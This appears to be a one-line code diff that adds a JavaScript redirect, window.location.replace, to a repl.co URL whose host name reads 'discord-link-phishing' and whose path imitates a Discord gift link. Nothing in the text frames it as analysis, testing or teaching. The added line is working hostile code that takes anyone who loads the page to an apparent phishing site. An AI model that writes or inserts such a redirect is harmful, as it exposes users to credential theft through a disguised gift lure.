@@ -1,0 +1,1 @@
+window.location.replace("http://discord-link-phishing.bogdan11212.repl.co/gift/HJ9fh9hGfgfijh93");
